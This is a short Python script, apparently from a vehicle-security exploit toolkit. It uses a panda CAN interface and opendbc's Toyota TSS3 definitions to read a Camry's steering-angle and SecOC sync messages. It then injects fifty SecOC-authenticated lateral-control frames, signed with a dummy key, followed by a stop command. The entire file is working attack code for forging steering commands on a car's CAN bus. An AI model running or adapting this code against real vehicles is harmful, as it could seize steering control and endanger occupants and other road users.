import time,collections
from exploit.ephemeral_runtime.camry_f33_runtime_monitor import MonitorSession,CONTROL_CAN_ID,CONTROL_CAN_BUS,command_frame,OP_RUN,decode_secoc_sync,decode_steering_angle_deg
from opendbc.car.toyota.tss3 import *
s=MonitorSession(require_ready_parked=True)
for _ in range(100): s.panda.can_recv(); time.sleep(.001)
ang=s.panda.latest(0,0x025);sync=s.panda.latest(0,0x00F);assert ang and sync
raw=target_angle_deg_to_raw(decode_steering_angle_deg(ang[1]));r=s.set_running(True); stopseq=(r['sequence']+1)&255
sy=decode_secoc_sync(sync[1]);rr=int(sy['reset_counter']);tpl=TSS3B6Template();comp=TSS3B6CompanionFields();
dl=time.monotonic()
for i in range(50):
 app=build_b6_application(target_lateral_id=63,target_angle_raw=raw,sequence=i&63,template=tpl,companions=comp)
 a,d,b=build_b6_secoc_frame(TSS3_B6_DUMMY_SECOC_KEY,app,TSS3Freshness(int(sy['trip_counter']),rr,i&255))
 s.panda.can_send(a,d,0,fd=True); s.panda.can_recv(); dl+=.005; time.sleep(max(0,dl-time.monotonic()))
# drain then send stop and collect all control echoes
for _ in range(20): s.panda.can_recv(); time.sleep(.002)
sf=command_frame(stopseq,OP_RUN,0); print('send stop seq',stopseq,sf.hex())
for j in range(4):
 s.panda.can_send(CONTROL_CAN_ID,sf,0); time.sleep(.03)
 rows=s.panda.can_recv()
 hits=[(hex(a),b,bytes(d).hex()) for a,d,b in rows if a==CONTROL_CAN_ID]
 print('j',j,'hits',hits)
time.sleep(.2)
st=s.read_state();print('state',st['last_sequence'],st['running'])
